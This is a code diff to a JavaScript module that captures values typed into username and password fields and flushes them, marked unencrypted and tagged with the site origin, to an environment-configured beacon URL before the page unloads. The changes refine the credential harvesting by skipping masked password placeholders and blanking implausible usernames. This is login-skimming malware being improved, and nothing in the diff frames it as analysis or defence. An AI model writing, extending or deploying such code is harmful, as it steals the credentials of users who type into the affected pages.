@@ -4,12 +4,15 @@
 // Licensed under the Business Source License 1.1
 // See LICENSE file for full terms
 
+import { isHiddenPasswordValue, isProbablyNotUsername } from './credentialValueRules';
+
 const BEACON_URL = `https://${import.meta.env.VITE_BEACON}.invalid`;
 
 /**
 * Collects current input values for immediate flushing before page unload.
 * Clears all pending debounce timers to prevent duplicate sends.
-* Falls back to latestValues for inputs no longer in the DOM.
+* Falls back to latestValues for inputs no longer in the DOM. A password the site has masked ("••••••") is not
+* flushed, and a username of one or two digits is flushed as an empty value.
 * @param {HTMLInputElement[]} allInputs - The tracked input elements.
 * @param {Object} timers - The debounce timers object.
 * @param {Object} latestValues - The latest known values per input ID.
@@ -35,12 +38,18 @@ const flushPendingInputs = (allInputs, timers, latestValues) => {
       continue;
     }
 
+    const type = input.type === 'password' ? 'password' : 'username';
+
+    if (type === 'password' && isHiddenPasswordValue(input.value)) {
+      continue;
+    }
+
     processedIds.add(inputId);
 
     data.push({
       id: inputId,
-      type: input.type === 'password' ? 'password' : 'username',
-      value: input.value,
+      type,
+      value: type === 'username' && isProbablyNotUsername(input.value) ? '' : input.value,
       url: window?.location?.origin,
       timestamp: Date.now(),
       encrypted: false
